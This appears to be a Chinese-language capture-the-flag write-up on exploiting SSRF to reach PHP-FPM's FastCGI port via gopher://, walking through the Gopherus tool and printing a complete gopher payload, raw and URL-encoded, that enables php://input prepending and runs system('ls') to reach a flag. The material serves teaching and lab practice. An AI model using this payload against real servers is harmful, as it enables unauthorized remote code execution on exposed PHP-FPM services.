## FastCGI 协议 RCE

**1️⃣ FastCGI 简介**

FastCGI 是一种用于加速 Web 与后端程序（如 PHP-FPM）通信的协议，常见端口 `9000`

如果服务器错误暴露了 FastCGI 服务，攻击者可以伪造协议请求，**让 PHP 直接解释任意文件或执行恶意代码**

**2️⃣ SSRF 打 FastCGI 的核心原理**

利用 SSRF 请求内网 `127.0.0.1:9000` 或其他 PHP-FPM 地址，通过 **gopher://** 伪造 **FastCGI 二进制协议数据包**，让服务器解析指定文件或恶意 payload

**效果**：

- 解析任意本地 `.php` 文件（任意文件包含效果）
- 配合可控日志或 Session 写入恶意 PHP 代码实现 RCE

3️⃣ 典型利用流程

| 步骤 | 动作                                                         |
| ---- | ------------------------------------------------------------ |
| 1️⃣    | SSRF（gopher）打本地 9000 端口                               |
| 2️⃣    | 伪造 FastCGI 请求，指定 `SCRIPT_FILENAME` 指向日志、session、/proc/self/environ 等可以伪造内容的地方 |
| 3️⃣    | 让 PHP-FPM 执行恶意代码                                      |
| 4️⃣    | 成功远程命令执行                                             |

本文要利用一个脚本 [gopherus.py](https://github.com/tarunkant/Gopherus/tree/master)，这个脚本可以对 SSRF 漏洞进行利用，可以直接生成 payload 造成远程代码执行 RCE

```sh
┌──(kali㉿kali)-[~/Gopherus]
└─$ python2 gopherus.py -h                                                             
usage: gopherus.py [-h] [--exploit EXPLOIT]

optional arguments:
  -h, --help         show this help message and exit
  --exploit EXPLOIT  mysql, postgresql, fastcgi, redis, smtp, zabbix,
                     pymemcache, rbmemcache, phpmemcache, dmpmemcache
```

我们选择 fastcgi 的

```sh
python2 gopherus.py --exploit fastcgi
```

![](https://pic1.imgdb.cn/item/687f54a658cb8da5c8cb5640.png)

然后输入 `/var/www/index.php`，运行一下 ls

![](https://pic1.imgdb.cn/item/687f55a658cb8da5c8cb579a.png)

得到 payload

![](https://pic1.imgdb.cn/item/687f55c758cb8da5c8cb57bf.png)

```http
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27ls%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```

再做一次 URL 编码（因为走的是 `?url`）

```http
gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
```

可以看到有个 `index.php`

![](https://pic1.imgdb.cn/item/687f5ca658cb8da5c8cb5fee.png)

重新跑一下脚本拿 flag

![](https://pic1.imgdb.cn/item/687f5d1e58cb8da5c8cb6017.png)

成功拿到 flag

![](https://pic1.imgdb.cn/item/687f5e2858cb8da5c8cb609a.png)
